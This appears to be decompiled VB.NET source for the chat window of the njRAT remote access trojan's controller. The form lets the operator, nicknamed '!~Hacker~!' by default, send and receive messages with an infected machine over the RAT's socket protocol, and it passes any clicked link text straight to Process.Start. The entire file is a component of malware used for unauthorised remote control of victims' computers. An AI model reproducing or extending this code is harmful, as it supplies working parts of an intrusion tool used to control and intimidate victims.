Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Chat
    Inherits Form
    ' Methods

    Public hk As String
    Public osk As Client
    Public sk As Client
    Public Sub New()
        Me.hk = "!~Hacker~!"
        Me.InitializeComponent()
    End Sub

    Private Sub Chat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If Me.sk.CN Then
            Me.sk.Send("@")
        End If
        Me.sk.CN = False
    End Sub

    Private Sub Chat_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = Conversions.ToString(Class7.smethod_1(Me.osk.L))
        Me.Show()
        Dim str As String = Interaction.InputBox("Enter Your NickName", "Chat", Me.hk, -1, -1)
        If (str = String.Empty) Then
            Me.sk.CN = False
        Else
            Me.hk = str
            Me.sk.Send(("~" & Class7.string_1 & Class6.smethod_14(Me.hk)))
        End If
        Me.vmethod_8.Enabled = True
        Me.T2.Select()
        Me.T2.Focus()
    End Sub

    Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs) Handles T2.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            e.SuppressKeyPress = True
            If (Me.T2.Text <> String.Empty) Then
                Dim chat As Chat = Me
                SyncLock chat
                    Me.T1.SelectionStart = Me.T1.TextLength
                    Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                    Me.T1.AppendText(("[" & Me.hk & "] "))
                    Me.T1.SelectionFont = Me.T1.Font
                    Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                    Me.T1.SelectionStart = Me.T1.TextLength
                    Me.T1.ScrollToCaret()
                    Dim box As TextBox = Me.T2
                    Dim text As String = box.Text
                    box.Text = [text]
                    Me.sk.Send(("!" & Class7.string_1 & Class6.smethod_14([text])))
                    Me.T2.Text = String.Empty
                End SyncLock
            End If
        Else
            Me.T2.Select()
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.T2.Text <> String.Empty) Then
            Dim chat As Chat = Me
            SyncLock chat
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                Me.T1.AppendText(("[" & Me.hk & "] "))
                Me.T1.SelectionFont = Me.T1.Font
                Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.ScrollToCaret()
                Dim box As TextBox = Me.T2
                Dim text As String = box.Text
                box.Text = [text]
                Me.sk.Send(("!" & Class7.string_1 & Class6.smethod_14([text])))
                Me.T2.Text = String.Empty
            End SyncLock
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles vmethod_8.Tick
        If ((Me.sk Is Nothing) Or (Me.osk Is Nothing)) Then
            If (Me.T2.Enabled Or (Me.T1.Text = String.Empty)) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
            Me.Close()
        ElseIf (Not Me.sk.CN Or Not Me.osk.CN) Then
            If (Me.T2.Enabled Or (Me.T1.Text = String.Empty)) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
            Me.Close()
        End If
    End Sub

    Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles T1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch exception1 As Exception
        End Try
    End Sub
End Class